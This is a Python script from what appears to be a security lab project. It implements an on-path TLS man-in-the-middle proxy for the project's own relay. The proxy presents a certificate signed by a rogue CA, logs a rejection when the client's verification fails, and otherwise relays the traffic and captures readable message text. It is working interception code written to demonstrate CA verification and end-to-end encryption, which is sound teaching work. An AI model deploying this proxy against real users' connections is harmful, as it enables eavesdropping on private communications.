"""Attack 1: an active on-path TLS man-in-the-middle with a forged certificate.

The attacker controls a router on the path (R1 in our topology) and redirects the relay's
port to this proxy, which presents a certificate for relay.local / 10.0.2.10 signed by the
ATTACKER's own CA. A correctly configured client trusts only our project CA, so the
handshake aborts with a verification failure and the proxy sees the client's fatal alert
(unknown_ca) instead of any application data.

The same proxy also answers the follow-up question "what if the client could be tricked
into trusting the attacker's CA?": it then terminates TLS, reads the application frames and
forwards them to the real relay over a second TLS connection. With TLS-only messaging it
reads everything; with E2EE it only ever sees ciphertext.

    # in the r1 namespace, plus the redirect (see scripts/attack_demo.sh):
    python3 attacks/tls_mitm.py --listen 9443 --upstream 10.0.2.10:8443
"""
import argparse
import os
import socket
import ssl
import sys
import threading

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
import tlsutil
from protocol import *

NAMES = {REGISTER: "REGISTER", LOOKUP: "LOOKUP", MESSAGE: "MESSAGE", ERROR: "ERROR", PUBLISH: "PUBLISH"}


class TlsMitm:
    def __init__(self, listen_port, upstream, rogue_dir="certs/rogue", real_ca="certs/ca.crt",
                 host="127.0.0.1", on_event=None, verbose=False):
        self.upstream, self.real_ca, self.on_event, self.verbose = upstream, real_ca, on_event, verbose
        self.ctx = tlsutil.server_ctx(os.path.join(rogue_dir, "server.crt"), os.path.join(rogue_dir, "server.key"))
        self.srv = socket.create_server((host, listen_port))
        self.srv.settimeout(0.5)
        self.port = self.srv.getsockname()[1]
        self._stop = False
        self.captured = []
        threading.Thread(target=self._loop, daemon=True).start()

    def emit(self, kind, **kw):
        if self.verbose:
            print("[mitm]", kind, {k: v for k, v in kw.items() if k != "raw"}, flush=True)
        if self.on_event:
            self.on_event(kind, **kw)

    def _loop(self):
        while not self._stop:
            try:
                c, addr = self.srv.accept()
            except socket.timeout:
                continue
            except OSError:
                return
            threading.Thread(target=self._session, args=(c, addr), daemon=True).start()

    def _session(self, raw, addr):
        try:
            raw.settimeout(10)
            victim = tlsutil.SafeTLS(self.ctx.wrap_socket(raw, server_side=True))
        except (ssl.SSLError, OSError) as e:
            # The client aborted: it did not accept our forged certificate.
            self.emit("victim-rejected", peer=addr, reason=str(getattr(e, "reason", None) or e))
            raw.close()
            return
        self.emit("victim-accepted", peer=addr, note="client TRUSTS the rogue CA; TLS terminated here")
        try:
            up = tlsutil.timed_connect(self.upstream[0], self.upstream[1],
                                       tlsutil.client_ctx(self.real_ca)).sock
        except Exception as e:
            self.emit("upstream-failed", reason=str(e))
            victim.close()
            return
        t = threading.Thread(target=self._pipe, args=(victim, up, "client->relay"), daemon=True)
        t.start()
        self._pipe(up, victim, "relay->client")

    def _pipe(self, src, dst, direction):
        try:
            while True:
                ftype, payload = recv_frame(src)
                self._look(direction, ftype, payload)
                send_frame(dst, ftype, payload)
        except (ConnectionError, OSError, ValueError) as e:
            self.emit("pipe-end", direction=direction, error=repr(e))
        finally:
            for s in (src, dst):
                try:
                    s.close()
                except OSError:
                    pass

    def _look(self, direction, ftype, payload):
        """What the attacker can read out of a frame it relays."""
        info = dict(direction=direction, frame=NAMES.get(ftype, ftype), size=len(payload))
        if ftype == MESSAGE and payload:
            who, body = unpack_name(payload)
            printable = body.isascii() and all(32 <= b < 127 or b in (9, 10, 13) for b in body)
            info.update(peer=who, readable=printable,
                        text=body.decode() if printable else None, ciphertext_head=body[:16].hex())
        self.captured.append(info)
        self.emit("frame", **info)

    def stop(self):
        self._stop = True
        try:
            self.srv.close()
        except OSError:
            pass


if __name__ == "__main__":
    p = argparse.ArgumentParser()
    p.add_argument("--listen", type=int, default=9443)
    p.add_argument("--bind", default="0.0.0.0")
    p.add_argument("--upstream", default="10.0.2.10:8443")
    p.add_argument("--rogue-dir", default="certs/rogue")
    p.add_argument("--real-ca", default="certs/ca.crt")
    a = p.parse_args()
    h, _, port = a.upstream.rpartition(":")
    TlsMitm(a.listen, (h, int(port)), a.rogue_dir, a.real_ca, host=a.bind, verbose=True)
    print(f"MITM listening on {a.bind}:{a.listen} -> {a.upstream} with a forged certificate")
    threading.Event().wait()
